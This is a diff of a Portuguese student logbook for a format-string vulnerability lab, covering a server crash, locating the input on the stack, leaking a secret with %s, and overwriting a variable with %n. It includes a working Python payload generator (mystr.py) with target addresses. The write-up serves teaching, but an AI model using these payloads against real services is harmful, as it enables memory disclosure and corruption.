@@ -1,6 +1,6 @@
 # Format-String Vulnerability Lab
 ## Questão 1
-__Task 1:__  
+### Task 1: 
 O objetivo desta task é fazer o programa format.c que está a correr no servidor dar crash atravez de uma vulnerabilidade de *Format String*.  
 
 O alvo do nosso ataque é a função printf que quando recebe mais especificadores de formato do que argumentos reais, não valida os ponteiros e passa a interpretar a partir da pilha. Em vez de verificar limites, o printf vai ler bytes da pilha como se fossem endereços válidos até que eventualmente provoque um crash por segfault (acesso a endereço inválido).
@@ -107,7 +107,7 @@ void dummy_function(char *str)
 }
 ```
 
-__Task 2:__  
+### Task 2A:
 Esta task consiste em obter o número de "%x" necessários para conseguir ler novamente os primeiros 2 bytes do input.
 
 Para isso utilizamos o mesmo setup da task 1 e corremos o comando *docker-compose up*. Com o servidor pronto preparamos um ficheiro file.txt com o código mystr.py para o ataque.
@@ -134,11 +134,52 @@ Após executar o código do terminal da direita na imagem 3, para determinar qua
 __Imagem 3:__ execução do ataque.
 ![imagem](docs/logbook6/task2A.png)
 
-Assim calculamos que são necessários 64 "\x" para imprimir até os primeiros 4 bytes do input.
+Assim calculamos que são necessários 64 "%x" para imprimir até os primeiros 4 bytes do input.
 Para demonstar o resultado obtido foi refeito o ataque com um input novo que contém 64 "%x" na imagem 4.
 
 __Imagem 4:__ Testagem do valor obtido
 ![imagem4](docs/logbook6/task2A_proof.png)
 
-__Task 3:__
+### Task 2B:
+Esta task consiste em imprimir a mensagem secreta no endereço __0x080b4008__ (obtido a partir do output do servidor na imagem 2). Para isso podemos modificar o código mystr.py para que, quando ler os primeiros 4 bytes da própria string utilize esse endereço que colocamos nessa posição para imprimir a mensagem secreta.
+
+__mystr.py (modificado):__
+```python
+N = 1500
+content = bytearray(0x0 for i in range(N))
+
+adress  = 0x080b4008 # Endereço da mensagem secreta
+content[0:4]  =  (adress).to_bytes(4,byteorder='little')
+leng = 4
+
+# imprimir lixo até atingir a própria string
+s = "%x\n"*63 # 64-1 para não consumir os primeiros 4 bytes
+fmt  = (s).encode('latin-1')
+content[4:4+len(fmt)] = fmt
+leng += len(fmt)
+
+# imprimir a mensagem secreta na posição dada pelos primeiros 4 bytes da string com %s
+specifier = "%s"
+fmt = (specifier).encode('latin-1')
+content[leng:leng+len(fmt)] = fmt
+
+with open('file.txt', 'wb') as f:
+    f.write(content)
+```
+
+Assim executamos o mesmo ataque da task 2A e recebemos a mensagem secreta no output do servidor como vemos na imagem 5.
+
+__Imagem 5:__ execução do ataque.
+![imagem](docs/logbook6/task2B.png)
+
+### Task 3A:
+Nesta task iremos reescrever a varíavel no endereço __0x080e5068__ (obtido a partir do output do servidor na imagem 2) utilizando o especificador de formato __%n__ que escreve no endereço indicado o número de bytes já impressos até ao momento.
+
+Para isso alteramos o código __mystr.py__ cujas váriaveis __adress__ e __specifier__ comtém agora os valores __0x080e5068__ e __'%n'__ respetivamente e executamos o mesmo ataque da task 2B. Assim verificamos que o valor original __0x11223344__ foi alterado para __0x0000012b__.
+
+__Imagem 6:__ execução do ataque.
+![imagem](docs/logbook6/task3A.png)
+
+### Task 3B:
+
 ## Questão 2
